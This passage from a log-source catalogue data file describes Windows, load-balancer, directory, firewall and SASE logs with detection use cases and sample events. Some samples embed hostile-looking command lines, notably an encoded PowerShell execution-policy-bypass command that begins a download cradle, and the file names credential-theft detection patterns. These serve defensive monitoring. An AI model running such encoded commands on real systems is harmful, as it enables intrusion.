        sampleEvent: 'Jun  6 14:32:08 prod-db-01 kernel: [4521678.123] Out of memory: Killed process 8921 (java) total-vm:8234567kB, anon-rss:4125678kB, file-rss:0kB, shmem-rss:0kB, UID:1001 pgtables:16384kB oom_score_adj:0\nJun  6 14:32:09 prod-db-01 systemd[1]: postgresql.service: Main process exited, code=killed, status=9/KILL\nJun  6 14:32:10 prod-db-01 kernel: [4521678.456] EXT4-fs error (device sda1): ext4_lookup:1234: inode #567890: comm systemd-journald: deleted inode referenced'
      }
    ]
  },
  {
    category: 'Windows',
    icon: '🪟',
    sources: [
      {
        id: 'windows-security',
        name: 'Windows Security Event Log',
        vendor: 'Microsoft',
        description: 'Windows Security Event Log capturing authentication events (4624/4625), privilege use (4672/4673), account management (4720-4738), object access (4656-4663), policy changes (4719), and process tracking (4688). The primary source for Windows endpoint and server security monitoring.',
        status: 'available',
        useCases: ['Logon Anomaly Detection', 'Brute Force Detection', 'Privilege Escalation', 'Lateral Movement', 'Account Manipulation', 'Process Execution Monitoring', 'Pass-the-Hash/Ticket', 'Credential Dumping', 'Compliance Auditing', 'Service Account Monitoring'],
        personas: ['SOC', 'Security Engineering', 'Incident Response', 'Compliance', 'Threat Hunting', 'Identity Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 12+ detection rules for logon anomalies (Type 10 from unusual IPs), credential theft (4648 explicit creds), privilege escalation (4672 abuse), and pass-the-hash patterns' },
            { persona: 'Data End User / Analyst', job: 'Investigate credential theft by correlating 4625 failure sequences with subsequent 4624 successes from different source IPs to identify compromised accounts within 5 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect lateral movement by identifying Type 3 network logons from non-admin workstations to sensitive servers using service accounts outside business hours' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume logon Type 3 events from known service accounts and machine accounts, reducing Windows Security log volume by 50-65% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route 4625/4648/4672/4720-4738 security events to SIEM while sending routine 4624 success events to Lake for baseline analysis and forensic search' },
            { persona: 'Team Leader', job: 'Demonstrate Windows Security log optimization savings per-DC with event ID volume breakdown showing maintained detection for all credential attack patterns' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Retain complete Windows authentication audit trail for 13+ months across all domain controllers to satisfy SOC2/PCI-DSS access logging requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate privileged account usage reports showing 4672 special privilege assignments and account management changes by actor and time window' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor account lockout patterns (4740) and Kerberos failures (4771) across DCs to detect authentication infrastructure issues within 3 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track service account logon patterns to identify credential rotation failures and unauthorized service account usage across the domain' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (Windows Event Logs input) / Windows Event Forwarding (WEF/WEC) / NXLog / Splunk UF',
        logFormat: 'Windows Event Log XML (EVTX) — structured with EventID, keywords, task category. Key EventIDs: 4624-4625 (logon), 4648 (explicit creds), 4672 (special privs), 4688 (process create), 4720-4738 (account mgmt).',
        avgEPS: '1,000-15,000 EPS per server depending on role and audit policy',
        sampleEvent: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/><EventID>4625</EventID><Level>0</Level><Task>12544</Task><Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime="2026-06-06T14:32:08.123Z"/><Computer>SRV01.corp.example.com</Computer></System><EventData><Data Name="TargetUserName">admin</Data><Data Name="TargetDomainName">CORP</Data><Data Name="Status">0xC000006D</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">203.0.113.99</Data><Data Name="IpPort">52341</Data><Data Name="SubStatus">0xC000006A</Data><Data Name="WorkstationName">ATTACKER-PC</Data></EventData></Event>'
      },
      {
        id: 'windows-system',
        name: 'Windows System Event Log',
        vendor: 'Microsoft',
        description: 'Windows System Event Log recording OS-level events including service start/stop (7035-7036), driver failures (7000-7001), time sync issues (129), disk errors (7, 9, 11, 15, 51, 153), BSOD bugcheck (1001), Windows Update (19/20), and network adapter events. Critical for infrastructure health monitoring.',
        status: 'available',
        useCases: ['Service Crash Monitoring', 'Driver Failure Detection', 'Disk Health Alerting', 'Time Sync Monitoring', 'Blue Screen Analysis', 'Windows Update Tracking', 'Network Adapter Issues', 'Unexpected Reboot Detection', 'System Resource Exhaustion', 'Cluster Failover Events'],
        personas: ['SRE', 'Platform Engineering', 'NOC', 'Windows Administration', 'DevOps', 'Security Engineering'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Detect service crashes (7034) and unexpected reboots (41/6008) within 60 seconds to initiate incident response before cascading failures impact SLA' },
            { persona: 'Data End User / Analyst', job: 'Track disk error trends (Event IDs 7/11/15/51/153) per server to predict storage failures and trigger proactive replacement within 48-hour maintenance windows' },
            { persona: 'Jack of All Trades', job: 'Correlate Windows Update events (19/20) with subsequent service failures and reboots to identify problematic patches within 24 hours of deployment' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for suspicious service installations (7045), driver load failures from unsigned binaries, and time sync manipulation indicating timestomping attempts' },
            { persona: 'Data End User / Analyst', job: 'Investigate unexpected service stop events by correlating with process execution and user logon context to differentiate maintenance from attacker activity' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter routine service start/stop cycles and informational driver events, reducing Windows System log volume by 55-70% while preserving error and warning-level events' },
            { persona: 'Data Engineer', job: 'Route disk errors, BSOD bugchecks, and unexpected reboots to SIEM/monitoring while sending full System log to Lake for trend analysis and capacity planning' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Track Windows Update compliance across fleet showing patch installation status, reboot pending duration, and failed update rates per server group' },
            { persona: 'Data End User / Analyst', job: 'Generate infrastructure health compliance reports showing uptime metrics, disk health trends, and service availability by server role and criticality tier' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Datadog', 'Dynatrace', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (Windows Event Logs input) / Windows Event Forwarding (WEF/WEC) / NXLog / SNMP traps',
        logFormat: 'Windows Event Log XML (EVTX). Key EventIDs: 6005/6006 (startup/shutdown), 7034-7036 (service control), 41 (unexpected reboot), 1001 (bugcheck), 129 (time sync), 7/11/15/51/153 (disk).',
        avgEPS: '200-3,000 EPS per server depending on role and health',
        sampleEvent: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Service Control Manager" Guid="{555908d1-a6d7-4695-8e1e-26931d2012f4}"/><EventID>7036</EventID><Level>4</Level><TimeCreated SystemTime="2026-06-06T14:32:08.123Z"/><Computer>SRV01.corp.example.com</Computer></System><EventData><Data Name="param1">Windows Update</Data><Data Name="param2">stopped</Data></EventData></Event>'
      },
      {
        id: 'windows-application',
        name: 'Windows Application Event Log',
        vendor: 'Microsoft',
        description: 'Windows Application Event Log capturing application-level events including .NET runtime errors (1026), application crashes (1000/1002), MSI installer events (1033/1040), MSSQL errors, IIS/W3SVC events, and custom application logging. Key source for application reliability and troubleshooting.',
        status: 'available',
        useCases: ['Application Crash Monitoring', 'Memory Leak Detection', '.NET Exception Tracking', 'Database Error Alerting', 'Installer/Deployment Tracking', 'Application Hang Detection', 'License Expiry Warnings', 'Custom App Health Metrics', 'Certificate Store Events'],
        personas: ['SRE', 'Application Development', 'Platform Engineering', 'NOC', '.NET Team', 'DBA'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Detect application crashes (1000) and .NET runtime exceptions (1026) within 90 seconds to initiate remediation before user-facing impact exceeds 5-minute SLA' },
            { persona: 'Data End User / Analyst', job: 'Track application hang events (1002) and correlate with memory consumption trends to identify memory leaks requiring application pool recycling' },
            { persona: 'Jack of All Trades', job: 'Correlate MSSQL error events with application crash patterns to identify database connectivity issues causing cascading application failures' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter informational MSI installer events and routine application status messages, reducing Application log volume by 45-65% while preserving all error-level events' },
            { persona: 'Data Engineer', job: 'Route crash dumps (1000), .NET exceptions (1026), and SQL errors to APM/SIEM while sending informational application telemetry to Lake for trend analysis' },
            { persona: 'Team Leader', job: 'Present per-application log volume breakdown showing optimization targets and cost savings from suppressing verbose application health checks' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for suspicious application installations, certificate store modifications, and .NET deserialization exceptions indicating exploitation attempts' },
            { persona: 'Data End User / Analyst', job: 'Investigate application exploitation by correlating .NET runtime exceptions with unusual module loads and process crash patterns indicating active attack payloads' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Deploy Cribl Edge Application Event Log collection with per-source provider filtering and deliver parsed events to monitoring stack within 20 minutes per server' },
            { persona: 'Platform Administrator', job: 'Standardize Application log collection across 200+ servers with centralized Edge fleet configuration filtering by provider name and event level' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['Splunk', 'Datadog', 'Dynatrace', 'New Relic', 'Cribl Lake', 'Amazon S3', 'Elastic'],
        collectionMethod: 'Cribl Edge (Windows Event Logs input) / Windows Event Forwarding (WEF/WEC) / NXLog / Application Insights bridge',
        logFormat: 'Windows Event Log XML (EVTX). Key EventIDs: 1000 (app crash), 1002 (app hang), 1026 (.NET runtime), 1033/1040 (MSI), plus vendor-specific IDs.',
        avgEPS: '100-5,000 EPS per server depending on application count and verbosity',
        sampleEvent: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Application Error"/><EventID>1000</EventID><Level>2</Level><TimeCreated SystemTime="2026-06-06T14:32:08.123Z"/><Computer>APP01.corp.example.com</Computer></System><EventData><Data>MyApp.exe</Data><Data>4.2.1.0</Data><Data>clr.dll</Data><Data>4.8.4682.0</Data><Data>c0000005</Data><Data>0x00000000001a2b3c</Data></EventData></Event>'
      },
      {
        id: 'windows-sysmon',
        name: 'Windows Sysmon (System Monitor)',
        vendor: 'Microsoft (Sysinternals)',
        description: 'Sysmon (System Monitor) telemetry providing detailed process creation with full command lines (Event 1), network connections (Event 3), file creation (Events 11/15), registry modifications (Events 12-14), DNS queries (Event 22), WMI events (Events 19-21), and process access/injection indicators (Events 8/10). The gold standard for Windows endpoint visibility.',
        status: 'available',
        useCases: ['Process Injection Detection', 'Malware Execution', 'Credential Dumping (LSASS)', 'Living-off-the-Land Binaries', 'Lateral Movement', 'Persistence Mechanisms', 'DNS-based C2', 'Registry Backdoors', 'DLL Hijacking', 'Named Pipe Abuse'],
        personas: ['SOC', 'Security Engineering', 'Threat Hunting', 'Incident Response', 'DFIR', 'Red Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 15+ detection rules for process injection (Event 8/10 targeting LSASS), LOLBin execution chains, persistence via registry (Events 12-14), and DLL hijacking with MITRE ATT&CK coverage' },
            { persona: 'Data End User / Analyst', job: 'Hunt for LSASS credential dumping by correlating ProcessAccess (Event 10) with suspicious granted access masks (0x1010/0x1410) from non-security tool processes' },
            { persona: 'Jack of All Trades', job: 'Detect living-off-the-land attacks by identifying suspicious parent-child process relationships (e.g., Office spawning PowerShell, WMI spawning cmd.exe) with encoded command lines' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume image load (Event 7) and DNS query (Event 22) events for known-good modules and domains, reducing Sysmon volume by 60-75% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route process creation (Event 1), network connections (Event 3), and process access (Event 10) to SIEM while sending file/registry telemetry to Lake for hunting' },
            { persona: 'Team Leader', job: 'Demonstrate Sysmon optimization ROI by event ID showing 65%+ volume reduction with full MITRE ATT&CK technique detection coverage maintained' }
          ]},
          { category: 'Platform Operations', jobs: [
            { persona: 'Platform Administrator', job: 'Manage Sysmon configuration deployment across 5000+ endpoints via fleet management ensuring consistent detection coverage within 24 hours of config updates' },
            { persona: 'Data Onboarder', job: 'Deploy Sysmon event collection via Cribl Edge with event ID-based routing to multiple destinations within 30 minutes per endpoint group' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Engineer', job: 'Normalize Sysmon events into unified process execution schema for cross-platform correlation with Linux auditd and macOS endpoint security telemetry' },
            { persona: 'Data Onboarder', job: 'Enrich Sysmon process events with hash reputation lookups and MITRE ATT&CK technique tagging before routing to detection platforms' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (Windows Event Logs input - Microsoft-Windows-Sysmon/Operational) / Windows Event Forwarding (WEF/WEC) / NXLog',
        logFormat: 'Windows Event Log XML (EVTX) under Microsoft-Windows-Sysmon/Operational. Key EventIDs: 1 (Process Create), 3 (Network), 7 (Image Load), 8 (CreateRemoteThread), 10 (ProcessAccess), 11 (FileCreate), 12-14 (Registry), 22 (DNS Query).',
        avgEPS: '2,000-30,000 EPS per endpoint depending on Sysmon config verbosity',
        sampleEvent: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/><EventID>1</EventID><Level>4</Level><TimeCreated SystemTime="2026-06-06T14:32:08.123Z"/><Computer>WKS01.corp.example.com</Computer></System><EventData><Data Name="UtcTime">2026-06-06 14:32:08.123</Data><Data Name="ProcessId">4521</Data><Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data><Data Name="CommandLine">cmd.exe /c powershell -ep bypass -nop -enc SQBFAFgAIAAoACgATgBlAHcALQBPAGIA</Data><Data Name="ParentImage">C:\\Windows\\explorer.exe</Data><Data Name="ParentCommandLine">C:\\Windows\\explorer.exe</Data><Data Name="User">CORP\\jsmith</Data><Data Name="Hashes">SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874714</Data><Data Name="ParentProcessId">2100</Data><Data Name="IntegrityLevel">Medium</Data></EventData></Event>'
      },
      {
        id: 'windows-wef',
        name: 'Windows Event Forwarding (WEF/WEC)',
        vendor: 'Microsoft',
        description: 'Consolidated Windows Event Log collection via Windows Event Forwarding infrastructure. WEF subscriptions aggregate events from Security, System, Application, Sysmon, PowerShell, and custom channels across the fleet to Windows Event Collector (WEC) servers. Provides centralized event routing, subscription management, and delivery guarantees.',
        status: 'available',
        useCases: ['Centralized Log Collection', 'Multi-Channel Correlation', 'Subscription Health Monitoring', 'Forwarding Latency Detection', 'Agent Coverage Gaps', 'Event Drop Detection', 'Collector Capacity Planning', 'Cross-Server Attack Correlation', 'Compliance Log Retention'],
        personas: ['Security Engineering', 'SOC', 'Platform Engineering', 'Windows Administration', 'Compliance', 'DFIR'],
        jobsToBeDone: [
          { category: 'Platform Operations', jobs: [
            { persona: 'Platform Administrator', job: 'Monitor WEF subscription health across 5000+ endpoints detecting forwarding failures and delivery latency exceeding 5-minute thresholds within 2 minutes' },
            { persona: 'Platform Operator', job: 'Scale WEC collector infrastructure to handle 200K+ EPS with zero event drops during peak authentication hours and deployment surges' },
            { persona: 'Data Onboarder', job: 'Deploy Cribl Edge on WEC servers with ForwardedEvents channel collection and multi-destination routing within 30 minutes per collector' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build cross-server correlation rules that detect attack progression across multiple endpoints by sequencing Security, Sysmon, and PowerShell events from WEF' },
            { persona: 'Data End User / Analyst', job: 'Investigate fleet-wide attacks by querying centralized WEF data to trace lateral movement across 100+ servers within a single 10-minute investigation workflow' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Track WEF agent coverage showing percentage of fleet forwarding events and identify machines dropping off subscription within 1 hour of last event' },
            { persona: 'Data End User / Analyst', job: 'Monitor forwarding latency distribution by source machine to identify network segments with degraded WEF delivery impacting detection timeliness' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Apply event ID-level filtering at the WEC/Cribl Edge layer to suppress noisy events before SIEM delivery, reducing forwarded volume by 50-65%' },
            { persona: 'Data Engineer', job: 'Route high-value Security and Sysmon events to SIEM while sending System and Application events to Lake, splitting WEF traffic by channel and severity' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge on WEC servers (Windows Event Logs input - ForwardedEvents channel) / Cribl Stream HTTP source (WEC → HTTP POST) / Direct WinRM collection',
        logFormat: 'Windows Event Log XML (EVTX) from ForwardedEvents channel. Each event retains original channel, provider, and computer name. Subscription metadata appended by WEC infrastructure.',
        avgEPS: '10,000-200,000 EPS per WEC server depending on subscription scope and fleet size',
        sampleEvent: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4688</EventID><Level>0</Level><TimeCreated SystemTime="2026-06-06T14:32:08.123Z"/><Computer>WKS042.corp.example.com</Computer><Channel>ForwardedEvents</Channel></System><EventData><Data Name="SubjectUserName">jsmith</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\script.ps1</Data><Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data><Data Name="TokenElevationType">%%1937</Data></EventData></Event>'
      }
    ]
  },
  {
    category: 'Load Balancers',
    icon: '⚖️',
    sources: [
      {
        id: 'f5-bigip-ltm',
        name: 'F5 BIG-IP LTM',
        vendor: 'F5 Networks',
        description: 'F5 BIG-IP Local Traffic Manager logs including HTTP request/response details, pool member health, SSL handshake events, iRule execution, and connection table events. Primary source for application delivery security and performance monitoring.',
        status: 'available',
        useCases: ['Web Application Attacks', 'Bot Detection', 'SSL/TLS Anomalies', 'DDoS Mitigation', 'Backend Pool Health', 'Latency Analysis', 'Connection Exhaustion', 'Certificate Expiry Monitoring'],
        personas: ['Security Engineering', 'SOC', 'SRE', 'Platform Engineering', 'NOC', 'Application Development'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor backend pool member health and response time p95/p99 to detect application degradation within 60 seconds and trigger automated failover' },
            { persona: 'Data End User / Analyst', job: 'Track SSL handshake failure rates and certificate expiry timelines to prevent service outages from expired or misconfigured TLS configurations' },
            { persona: 'Jack of All Trades', job: 'Correlate connection table exhaustion trends with traffic volume spikes to predict capacity issues and right-size virtual server configurations' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for DDoS layer 7 attacks (HTTP flood patterns), SSL renegotiation abuse, and bot traffic exceeding rate limit thresholds per virtual server' },
            { persona: 'Data End User / Analyst', job: 'Investigate application-layer attacks by correlating iRule-logged request anomalies with source IP reputation and geographic access patterns within 5 minutes' },
            { persona: 'Data Content Creator', job: 'Create alerts for SSL/TLS downgrade attempts, invalid client certificates, and cipher suite negotiation anomalies indicating MITM or scanning activity' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress repetitive health monitor check logs and routine pool member status messages, reducing F5 LTM log volume by 55-70% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route security-relevant iRule alerts and SSL errors to SIEM while sending performance metrics and access logs to Lake for capacity analytics' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure HSL (High-Speed Logging) profiles with syslog delivery to Cribl Stream and parse iRule key-value logs within 30 minutes per BIG-IP cluster' },
            { persona: 'Data Engineer', job: 'Normalize F5 LTM access logs into common load balancer schema for cross-platform correlation with AWS ALB and NGINX upstream metrics' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Datadog', 'Dynatrace', 'Cribl Lake', 'Elastic'],
        collectionMethod: 'Syslog (HSL) / iRule logging / REST API / SNMP traps',
        logFormat: 'Syslog (RFC 3164/5424) with configurable HSL (High-Speed Logging) profiles. iRule-generated logs follow custom key=value or JSON format. Management plane uses structured audit logging.',
        avgEPS: '5,000-50,000 EPS depending on virtual server traffic volume and logging profile verbosity',
        sampleEvent: 'Jun 06 14:22:18 bigip01.prod ltm[12345]: Rule /Common/http_request_logging <HTTP_REQUEST>: 10.1.2.100 -> 203.0.113.50:443 GET /api/v2/users HTTP/1.1 Host=api.example.com User-Agent="Mozilla/5.0" X-Forwarded-For=198.51.100.42 pool=/Common/api_pool member=10.10.1.5:8080 response_time=45ms status=200 bytes_in=1234 bytes_out=56789 ssl_cipher=ECDHE-RSA-AES256-GCM-SHA384 ssl_protocol=TLSv1.3'
      }
    ]
  },
  {
    category: 'Directory Services',
    icon: '🏢',
    sources: [
      {
        id: 'active-directory',
        name: 'Active Directory',
        vendor: 'Microsoft',
        description: 'Windows Active Directory Security and Directory Service event logs including authentication (Kerberos/NTLM), group policy changes, object modifications, replication events, and domain controller health. The foundational identity data source for on-premises Windows environments.',
        status: 'available',
        useCases: ['Credential Theft Detection', 'Privilege Escalation', 'Lateral Movement', 'Golden Ticket Detection', 'Group Policy Abuse', 'Replication Health', 'Account Lockout Troubleshooting', 'Service Account Monitoring'],
        personas: ['SOC', 'Security Engineering', 'Identity Team', 'Incident Response', 'Platform Engineering', 'NOC'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 10+ detection rules for Kerberoasting (4769 with RC4), Golden Ticket usage (4768 anomalies), DCSync attacks (4662 replication rights), and group policy abuse with MITRE ATT&CK mapping' },
            { persona: 'Data End User / Analyst', job: 'Investigate credential theft by correlating Kerberos ticket requests (4768/4769) with unusual encryption types and service account targeting patterns within 5 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect privilege escalation by identifying group membership changes (4728/4732) adding users to Domain Admins or other sensitive groups outside change control windows' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor AD replication health (1566/1988) and detect replication failures between domain controllers within 5 minutes to prevent authentication outages' },
            { persona: 'Data End User / Analyst', job: 'Track account lockout patterns (4740) across DCs to identify the originating source and differentiate misconfigured services from active brute force attacks' },
            { persona: 'Platform Administrator', job: 'Audit group policy modifications and GPO link changes to detect unauthorized security policy weakening across OUs within 15 minutes of change' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Retain complete AD authentication and directory modification audit trail for 13+ months across all DCs to satisfy SOC2/PCI-DSS identity management requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate privileged group membership reports showing all changes to Domain Admins, Enterprise Admins, and Schema Admins with actor attribution and approval status' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume Kerberos TGT renewals and computer account authentication events, reducing AD security log volume by 50-65% while preserving all human authentication and change events' },
            { persona: 'Data Engineer', job: 'Route Kerberos anomalies, group changes, and replication events to SIEM while sending routine authentication success events to Lake for baseline and forensic analysis' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Cribl Lake', 'Elastic'],
        collectionMethod: 'Windows Event Forwarding (WEF) / Cribl Edge agent / NXLog / Splunk UF',
        logFormat: 'Windows Event Log XML (EVTX) — structured with EventID, Provider, Correlation, EventData. Critical channels: Security (4624-4634, 4648, 4672, 4720-4738, 4768-4776), Directory Service (1566, 1988, 2887), DNS Server.',
        avgEPS: '2,000-20,000 EPS per domain controller depending on domain size, authentication volume, and audit policy verbosity',
        sampleEvent: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4624</EventID><TimeCreated SystemTime="2026-06-06T14:22:18.123Z"/><Computer>DC01.corp.example.com</Computer></System><EventData><Data Name="TargetUserName">jsmith</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.1.2.100</Data><Data Name="AuthenticationPackageName">Kerberos</Data><Data Name="LogonProcessName">Kerberos</Data></EventData></Event>'
      }
    ]
  },
  {
    category: 'Additional Firewalls',
    icon: '🔥',
    sources: [
      {
        id: 'fortinet-fortigate',
        name: 'Fortinet FortiGate Traffic & UTM Logs',
        vendor: 'Fortinet',
        description: 'Next-generation firewall logs from FortiGate appliances covering traffic sessions, UTM threat detection (antivirus, IPS, web filter, application control), VPN tunnels, and system events. Delivered via syslog or FortiAnalyzer.',
        status: 'available',
        useCases: ['Security Detection', 'Threat Prevention', 'Policy Enforcement', 'VPN Monitoring', 'Application Control', 'Web Filtering', 'Network Troubleshooting'],
        personas: ['Security Engineering', 'SOC', 'NOC', 'Platform Engineering', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Reduce FortiGate log volume by 40-55% by filtering routine allow traffic while preserving all UTM, deny, and VPN events for SIEM' },
            { persona: 'Data Engineer', job: 'Route UTM threat events to SIEM at full fidelity while sending session logs to Lake at storage-tier cost' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for port scanning, brute force attempts, IPS signature matches, and policy violations using pre-enriched FortiGate fields' },
            { persona: 'Data End User / Analyst', job: 'Correlate UTM blocks with traffic patterns to identify compromised hosts attempting lateral movement' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor VPN tunnel health, session counts, and bandwidth utilization across FortiGate clusters' },
            { persona: 'Data End User / Analyst', job: 'Track application usage trends and web filter block rates to inform policy tuning' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Parse FortiGate key=value syslog format and route to multiple destinations within 30 minutes using pre-built pack pipelines' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (UDP/TCP/TLS) / FortiAnalyzer / REST API',
        logFormat: 'Key=value pair format: date=YYYY-MM-DD time=HH:MM:SS devname=hostname devid=serial logid=ID type=traffic/utm subtype=forward/ips/webfilter. Critical fields: srcip, dstip, srcport, dstport, action, service, policyid, app, utmaction.',
        avgEPS: '5,000-150,000 EPS depending on throughput, UTM features enabled, and logging verbosity',
        sampleEvent: 'date=2026-06-11 time=14:32:08 devname="FGT-HQ-01" devid="FG100F0000000001" logid="0000000013" type="traffic" subtype="forward" level="notice" vd="root" eventtime=1718107928 srcip=10.0.1.50 srcport=52341 srcintf="port1" dstip=203.0.113.100 dstport=443 dstintf="port2" policyid=5 sessionid=574326 proto=6 action="accept" duration=45 sentbyte=15000 rcvdbyte=89000 sentpkt=25 rcvdpkt=20 appcat="Web.Client" app="HTTPS.BROWSER" srccountry="Reserved" dstcountry="United States"'
      }
    ]
  },
  {
    category: 'SASE / Cloud Security',
    icon: '☁️',
    sources: [
      {
        id: 'netskope',
        name: 'Netskope Cloud Activity & Alert Logs',
        vendor: 'Netskope',
        description: 'Cloud-native SASE platform logs covering web transactions, CASB activity, DLP violations, threat protection events, private access connections, and user behavior analytics. Delivered via REST API or Cloud Log Shipper.',
        status: 'available',
        useCases: ['Cloud DLP', 'Shadow IT Discovery', 'Threat Protection', 'CASB Policy Enforcement', 'Zero Trust Access', 'User Risk Scoring', 'Data Exfiltration Detection'],
        personas: ['Cloud Security', 'SOC', 'Security Engineering', 'Compliance', 'Data Protection'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for anomalous cloud app usage, DLP policy violations, and malware downloads across SaaS applications' },
            { persona: 'Data End User / Analyst', job: 'Investigate shadow IT usage patterns and identify unsanctioned cloud storage sharing sensitive data' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress high-volume benign web transaction logs while preserving all alerts, DLP events, and threat detections for SIEM routing' },
            { persona: 'Data Engineer', job: 'Route Netskope alerts and DLP matches to SIEM while sending page visits and application activity to Lake for behavioral analysis' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete audit trail of DLP violations and cloud sharing events for regulatory compliance reporting' },
            { persona: 'Data End User / Analyst', job: 'Generate reports on data exposure risk by application, user, and sensitivity classification' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Netskope Cloud Log Shipper integration and parse JSON events for multi-destination routing within 1 hour' }
          ]}
        ],
